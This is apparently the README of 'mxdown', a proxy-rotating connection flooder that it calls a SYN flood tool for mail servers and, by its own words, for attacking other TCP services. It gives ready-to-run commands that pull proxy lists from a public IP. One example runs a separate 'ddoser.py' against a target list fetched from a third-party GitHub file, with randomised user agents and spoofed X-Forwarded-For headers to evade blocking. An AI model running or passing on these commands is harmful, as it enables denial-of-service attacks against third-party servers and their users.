# mxdown
Check how much load your MX server (or other TCP Server) can handle via SYN flood atack.

Originally was needed to "test" mail server, but with few additional options `--just-connect`, `--direct-host` and `--port 5432` can be used to test the load or attack other services.

## Example
```shell
./maildown.py --host yourdomain.com --sleep-delay 100 -vvv --restart-period 600 --log-to-stdout --proxy-url http://143.244.166.15/proxy.list --concurrency 1
```

Remove `-vvv` to disable debug.

## Docker-based setup (the easy way)
### Build

```docker build -t mxdown .```

### Run

```shell
docker run -it mxdown  --host yourdomain.com --sleep-delay 100 -vvv --restart-period 600 --log-to-stdout --proxy-url http://143.244.166.15/proxy.list --concurrency 1
```

## Install
### Linux
```shell
sudo apt install python3
sudo apt install python3-pip
git clone git@github.com:dnikolayev/mxdown.git
cd mxdown/
pip install -r requirements.txt
```
### MacOs
Download and install python3.7-3.9 form here https://www.python.org/downloads/macos/ if you don't have it
or install by brew
```shell
brew install python@3.9
brew link python@3.9
```
### Common for any system
```shell
git clone git@github.com:dnikolayev/mxdown.git
cd mxdown/
pip install -r requirements.txt
```
## Run
```shell
Usage: maildown.py [OPTIONS]

  Run mxdown

Options:
  --host TEXT                  target host
  --port INTEGER               Port to connect, default: 25
  --sleep-delay INTEGER        Time to sleep after connection
  --proxy-url TEXT             url to proxy resourse
  --proxy-file TEXT            path to file with proxy list
  --concurrency INTEGER        concurrency level
  -v, --verbose                Show verbose log
  --log-to-stdout              log to console
  --direct-host                Do not get MX from domain, just connect to provided host
  --restart-period INTEGER     period in seconds to restart application (reload proxies ans targets)
  --shuffle-proxy              Shuffle proxy list on application start
  --help                       Show this message and exit.
```
proxy-file or proxy-url should contain proxy list in format like:
```text
ip1:port1#sock5
ip2:port2#sock4
ip3:port3#sock4 login:password
ip4:port4#http login:password
ip5:port5#http login:password
ip6:port6#https login:password
...
ipN:portN#sock4
```
### Example cmd
```shell
python3 ./ddoser.py --concurrency 150 --timeout 60 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --target-urls-file https://raw.githubusercontent.com/maxindahouze/reactor/main/targets3.txt --proxy-url 'http://143.244.166.15/proxy.list' --restart-period 600 --random-xff-ip
```
## Notes
**mxdown** supports SOCKS4/5 and HTTP(s) proxies with or without authorization, also can start it directly without proxy

Use **--restart-period** parameter to periodically reloading targets and proxies list

If you see an error `too many open files` then you can decrease concurrency/targets count but first of all
try to increase the limits:
### Linux/MacOS:
```shell
ulimit -n 100000
```
### WSL:
```shell
mylimit=100000
sudo prlimit --nofile=$mylimit --pid $$; ulimit -n $mylimit
```
